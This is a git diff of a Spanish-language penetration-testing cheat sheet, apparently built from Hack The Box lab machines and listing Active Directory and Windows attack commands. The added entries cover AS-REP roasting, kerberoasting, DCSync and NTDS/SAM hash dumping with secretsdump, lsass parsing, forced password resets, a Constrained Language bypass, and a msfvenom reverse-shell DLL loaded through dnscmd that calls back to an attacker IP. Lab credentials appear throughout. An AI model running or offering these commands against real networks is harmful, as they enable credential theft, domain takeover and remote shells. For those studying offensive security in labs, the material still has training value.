@@ -99,6 +99,12 @@ Protocolo: "Comandos"
 Herramienta: "net" 
 Descripcion: Obtener informacion de un usuario
 Comando: net user <user_name>
+------------------------------------------------------------------------------------------------------------------------>
+Categoria: "Windows"
+Protocolo: "Comandos"
+Herramienta: "net"
+Descripcion: Agregar un usuario a un grupo
+Comando: net group "Grupo" usuario /add
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Windows"
 Protocolo: "Comandos"
@@ -489,6 +495,8 @@ Protocolo: "SMB"
 Herramienta: "smbcacls"
 Descripcion: Listar los permisos de un recurso con smbcalcs 
 Comando:
+tput civis; for directory in $(ls); do echo -e "\n[+] Enumerando permisos en el directorio $directory:\n"; echo -e "\t$(smbcacls "//10.129.30.127/Department Shares" Users/$directory -N | grep "Everyone")"; done; tput cnorm
+
 for file in $(ls); do echo $file; done | grep -v -i "^ntuser" | while read line; do echo -e "\n[*] $line:\n"; smbcacls //10.10.10.40/Users Default/$line -N | grep -i "everyone"; done 
 smbcacls //10.10.10.10/Recurso_Compartido dominio -U 'usuario%contraseña'
 Ejemplo: smbcacls //10.10.10.100/Replication active.htb -U 'SVC_TGS%GPPstillStandingStrong2k18'
@@ -506,15 +514,6 @@ NOTA:  Intentaremos crear un archivo y directorio en cada directorio del recurso
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Active Directory"
 Protocolo: "SMB"
-Herramienta: "smbcacls"
-Descripcion: Listar los permisos de un recurso con smbcalcs
-Comando:
-for file in $(ls); do echo $file; done | grep -v -i "^ntuser" | while read line; do echo -e "\n[*] $line:\n"; smbcacls //10.10.10.40/U>
-smbcacls //10.10.10.10/Recurso_Compartido dominio -U 'usuario%contraseña'
-Ejemplo: smbcacls //10.10.10.100/Replication active.htb -U 'SVC_TGS%GPPstillStandingStrong2k18'
-------------------------------------------------------------------------------------------------------------------------------------
-Categoria: "Active Directory"
-Protocolo: "SMB"
 Herramienta: "smbclient"
 Descripcion: Listar de manera recursiva el contenido de los recursos compartidos donde tengo acceso con smbclient
 Comando: smbclient -L 10.10.10.103 -N 2>/dev/null | grep "Disk" | sed 's/\s*\(.*\)\s*Disk.*/\1/' | while read sharedFolder; do echo "===${sharedFolder}==="; smbclient -N "//10.10.10.103/${sharedFolder}" -c dir; echo; done
@@ -527,12 +526,21 @@ Comando: smbclient -L 10.10.10.52 -U james%J@m3s_P@ssW0rd!
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Active Directory"
 Protocolo: "SMB"
+Herramienta: "smbclient"
+Descripcion: Listar recurso compartidos con smbclient recursivamente
+Comando: UNa vez conectados al recurso compartido mediante smbclient ejecutar:
+1. recurse ON
+2. prompt OFF 
+3. mget * 
+------------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"
 Herramienta: "smbmap"
 Descripcion: Listar de forma recursiva todos los recursos que estan bajo el dominio que especifiquemos   
 Comando: 
-smbmap -d dominio -H 10.10.10.100 -R recurso_compartido 
-ejemplo: smbmap -d active.htb -H 10.10.10.100 -R Repli 
-smbmap -d active.htb -H 10.10.10.100 -R Replication -A Group.xml -q -> Buscar de forma recursiva pero descargar el archivo Group.xml cuando lo encuentre 
+smbmap -d dominio -H 10.10.10.100 -r recurso_compartido 
+ejemplo: smbmap -d active.htb -H 10.10.10.100 -r Repli 
+smbmap -d active.htb -H 10.10.10.100 -r Replication -A Group.xml -q -> Buscar de forma recursiva pero descargar el archivo Group.xml cuando lo encuentre 
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Active Directory"
 Protocolo: "SMB"
@@ -965,6 +973,12 @@ Protocolo: "Comandos"
 Herramienta: "net"
 Descripcion: Crear un usuario
 Comando: net user <user_name> <password> /add
+------------------------------------------------------------------------------------------------------------------------>
+Categoria: "Windows"
+Protocolo: "Comandos"
+Herramienta: "net"
+Descripcion: Crear un usuario a nivel de dominio
+Comando: net user <user_name> <password> /add /domain
 ------------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Windows"
 Protocolo: "Comandos"
@@ -1205,7 +1219,8 @@ Categoria: "Active Directory"
 Protocolo: "Kerberos"
 Herramienta: "GetNPUsers"
 Descripcion: Ataque Asreproasting
-Comando:python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py htb.local/ -no-pass -usersfile users.txt -dc-ip 10.10.10.161
+Comando: python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py htb.local/ -no-pass -usersfile users.txt -dc-ip 10.10.10.161
+Comando: for user in $(cat users.txt); do $(locate GetNPUsers.py) -no-pass -dc-ip 10.129.13.73 blackfield.local/$user | grep krb5asrep; done
 NOTA: Para poder realizar este ataque unicamente se necesitan conocer usuarios pertenecientes al AD
 -----------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Active Directory"
@@ -1216,7 +1231,7 @@ Comando: smbmap -H 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
 -----------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Active Directory"
 Protocolo: "LDAP"
-Herramienta: "ldapdomain"
+Herramienta: "ldapdomaindump"
 Descripcion: Enumeracion de ldap 
 Comando: ldapdomaindump -u 'htb.local\svc-alfresco' -p 's3rvice' 10.10.10.161
 -----------------------------------------------------------------------------------------------------------------------------------
@@ -1245,9 +1260,11 @@ NOTA: Cuando el usuario comprometido forma parte del grupo Account operators tie
 -----------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Active Directory"
 Protocolo: "windows"
-Herramienta: "bloodhound"
-Descripcion: dcsync attack
-Comando:  
+Herramienta: "impacket-secretsdump"
+Descripcion: DCSync attack
+Comando: impacket-secretsdump -just-dc-ntlm <dominio>/SrP3rr1n:Admin123.@10.129.95.210
+Configuracion manual del ataque:
+permisos para poder realizar el ataque (EL usuario debe estar en el grupo Exchange Windows Permissions):  
 1. $SecPassword = ConvertTo-SecureString 'Admin123.' -AsPLainText -Force 
 2. $Cred = New-Object System.Management.Automation.PSCredential('htb.local\srp3rr1n', $SecPassword)
 3. Cargar powerview.ps1 a la maquina victima
@@ -1269,6 +1286,8 @@ Descripcion: Crear una montura de un recurso compartido
 Comando: 
 1. mkdir /mnt/smbmounted
 2. mount -t cifs //10.10.10.100/Users /mnt/smbmounted -o username=SVC_TGS,password=GPPstillStandingStrong2k18,domain=active.htb,rw
+3. mount -t cifs //10.10.10.100/Users /mnt/smbmounted
+NOTA: Una vez que se tiene la montura ejecutar un tree -fas para ver todos los archivos de la montura con su ruta absoluta
 -----------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Active Directory"
 Protocolo: "Kerberos"
@@ -1276,7 +1295,7 @@ Herramienta: "GetUserSPNs"
 Descripcion: Ataque kerberoasting (obtener un TGS)
 Comando:
 1. Comporbacion si el usuario es kerberoasteable -> /usr/share/doc/python3-impacket/examples/GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18
-2. Obtener el hash -> /usr/share/doc/python3-impacket/examples/GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 
+2. Obtener el hash -> /usr/share/doc/python3-impacket/examples/GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
 NOTA: Se requieren credenciales validas para efectuar el ataque
 -----------------------------------------------------------------------------------------------------------------------------------
 Categoria: "Active Directory"
@@ -1297,4 +1316,155 @@ Protocolo: "AD"
 Herramienta: "bloodhound"
 Descripcion: Ejecucion de bloodhound de forma remota con credenciales
 Comando: bloodhound-python -c all -u 'support' -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local
+NOTA: Se utiliza cuando se tienen credenciales validas pero que no dan acceso a la maquina es decir credenciales validas solo en servicios como SMB
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "RPC"
+Herramienta: "rpcclient"
+Descripcion: Cambiar la contrasena de un usuario (Cuando un usuario tiene el permiso ForceChangePassword sobre otro usuario puede cambiarle la contrasena a ese usuario)
+Comando: net rpc password audit2020 -U 'support' -S 10.10.10.192
+NOTA: Debe introducirse primero la contrasena del usuario que queremos cambiar y luego nos pedira nuetsra contrasena
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "SMB"
+Herramienta: "pypykatz"
+Descripcion: Dumpear archivo lsass 
+Comando: pypykatz lsa minidump lsass.DMP
+NOTA: Cuando se tenga un archivo lsass darle un file si el archivo es mini DUMP con pypykatz podemos dumpearlo para obtener algunos hashesh
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "Windows"
+Herramienta: "reg save"
+Descripcion: Hacer una copia de los archivos system y sam
+Comando: 
+1. reg save HKLM\system system
+2. reg save HKLM\sam sam    
+NOTA: Cuando se tenga el permiso SeBackupPrivilege puede hacerse un backup de cualquier archivo en este caso conviene hacerlo a los archivos system y sam para poder dumpear los hashesh d elos usuarios locales 
+NOTA2: Es mas importante dumpear el archivo ntds ya que extraera todos los hashes de los usuarios del dominio, el archivo comunmente se almacena en C:\Windows\NTDS por defecto no deja hacer el backup pero abusando del privilegio SeBackupPrivilege es posible primero debe crearse una unidad logica 
+1. 
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "Windows"
+Herramienta: "impacket-secretsdump"
+Descripcion: Realizar un ataque dcsync con los archivos system y sam
+Comando: impacket-secretsdump -system system -sam sam LOCAL
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "Windows"
+Herramienta: "impacket-secretsdump"
+Descripcion: Realizar un ataque dcsync con los archivos system y ntds.dit
+Comando: impacket-secretsdump -system system -ntds ntds.dit LOCAL
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Comandos"
+Protocolo: "Linux"
+Herramienta: "xargs"
+Descripcion: Convertir saltos de linea en una sola linea
+Comando: cat file.txt | xargs
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Comandos Vim"
+Protocolo: "Linux"
+Herramienta: "vim"
+Descripcion: Convertir saltos de linea en una sola linea mediante una sustitucion
+Comando: :%s/\n/,
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "DNS"
+Herramienta: "msfvenom"
+Descripcion: Crear una DLL maliciosa para manipular el servicio DNS al arrancarlo y obtener una SHELL (Se puede usar cuando el usuario forma parte del grupo DNSAdmins)
+Comando: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.194 LPORT=443 -f dll -o pwned2.dll
+Ejecucion: 
+1. impacket-smbserver smbFolder $(pwd) -smb2support
+2. dnscmd.exe /config /serverlevelplugindll \\10.10.14.194\smbFolder\pwned2.dll
+3. sc.exe stop dns
+4.sc.exe start dns
+NOTA: Realizar el proceso varias veces hasta que mande la shell a mi netcat
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "SSL"
+Protocolo: "HTTPS"
+Herramienta: "openssl"
+Descripcion: Inspeccionar certificado SLL
+Comando: openssl s_client -connect 10.129.30.127:443
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "Winrm"
+Herramienta: "evil-winrm"
+Descripcion: Iniciar sesion mediante evil-winrm utilizando un certificado y llave privada
+Comando: evil-winrm -S -c certnew.cer -k amanda.key -i 10.129.29.45 -u 'amanda' -p 'Ashare1972'
+NOTA: Se necesita generar un certificado en un Active Directory Certificated Services, primero se necesita generar una llave privada y esa proporcionarla para generar el certificado
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "Powershell"
+Herramienta: "powershell"
+Descripcion: Revisar en que tipo de lenguaje estamos (Full Language o Constrained Language)
+Comando: $ExecutionContext.SessionState.LanguageMode
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "Powershell"
+Herramienta: "powershell"
+Descripcion: Bypass al Constrained Language para tener una shell con Full Language
+Comando: cargar PsBypassCLM.exe a la maquina victima y ejecutar: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.14.194 /rport=443 /U C:\Windows\Temp\Recon\PsBypassCLM.exe
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "Kerberos"
+Herramienta: "rubeus"
+Descripcion: Kerberoasting desde rubeus (Este ataque se puede hacer desde una sesion cmd)
+Comando: .\Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Ashare1972
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "Kerberos"
+Herramienta: "goldenpac"
+Descripcion: Explotacion de MS14-068 (goldenpac)
+Comando: python /usr/share/doc/python3-impacket/examples/goldenPac.py htb.local/james@mantis
+NOTA: Se necesitan credenciales y agregar al /etc/hosts el dominio y nombre de la maquina
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "ldap"
+Herramienta: "ldapsearch"
+Descripcion: Autenticacion simple
+Comando: ldapsearch -x -h 10.10.10.161
+NOTA: Si no funciona ese comando, ejecutar: ldapsearch -x -H ldap://10.129.101.46 
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "ldap"
+Herramienta: "ldapsearch"
+Descripcion: Identificar el dominio de la maquina
+Comando: ldap -x -h 10.10.10.161 -s base namingcontexts
+NOTA: Si no funciona ese comando, ejecutar: ldapsearch -x -H ldap://10.129.101.46 -s base namingcontexts
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "ldap"
+Herramienta: "ldapsearch"
+Descripcion: Dumpear informacion
+Comando: ldapsearch -x -h 10.10.10.161 -b 'DC=htb,DC=local'
+NOTA: Si no funciona ese comando, ejecutar: ldapsearch -x -H ldap://10.129.30.213 -b "DC=cascade,DC=local"
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Database"
+Protocolo: "SQL"
+Herramienta: "sqlite3"
+Descripcion: Iniciar sesion en sqlite3 con un archivo.db
+Comando: sqlite3 Audit.db
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Database"
+Protocolo: "SQL"
+Herramienta: "sqlite3"
+Descripcion: Enumerar tablas de una BD
+Comando: .tables
+
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Comandos"
+Protocolo: "Linux"
+Herramienta: "strings"
+Descripcion: Mostrar las cadenas legibles de un ejecutable o binario
+Comando: strings archivo.exe
+NOTA: si se trata de windows agregar la opcion -e l
+-----------------------------------------------------------------------------------------------------------------------------------
+Categoria: "Active Directory"
+Protocolo: "Powershell"
+Herramienta: "get-adobject"
+Descripcion: Obtener infomracion de usuarios borrados
+Comando: get-adobject -Filter {Deleted -eq $true -and ObjectClass -eq "user"} -IncludeDeletedObjects
+Comando2: get-adobject -Filter {Deleted -eq $true -and ObjectClass -eq "user"} -IncludeDeletedObjects -Properties *
+NOTA: Es necesario estar en el grupo AD Recycle Bin
+
+
 
